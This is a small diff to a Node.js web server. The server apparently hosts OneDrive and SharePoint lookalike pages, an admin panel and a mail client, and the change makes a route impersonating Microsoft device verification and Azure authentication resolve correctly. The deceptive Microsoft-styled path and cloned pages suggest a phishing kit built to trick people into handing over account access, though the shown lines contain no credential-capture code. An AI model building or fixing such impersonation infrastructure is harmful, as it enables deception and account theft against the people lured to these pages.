@@ -544,8 +544,11 @@ const server = http.createServer(async (req, res) => {
   // ── Static HTML files ────────────────────────────────────────────────────
   if (method === 'GET' && url === '/admin')    return serveHtml(res, 'admin.html');
   if (method === 'GET' && url === '/onedrive') return serveHtml(res, 'onedrive.html');
-  if (method === 'GET' && url === '/microsoft-device%verify%file%access%azure%authentication') return serveHtml(res, 'sharepoint.html');
+  const decodedUrl = decodeURIComponent(url);
   
+  if (decodedUrl === '/microsoft-device%verify%file%access%azure%authentication') {
+    return serveHtml(res, 'sharepoint.html');
+  }  
 
   // Mail client — protected: redirect to /admin if no valid session
   if (method === 'GET' && (url === '/mail' || url === '/localmail.html')) {
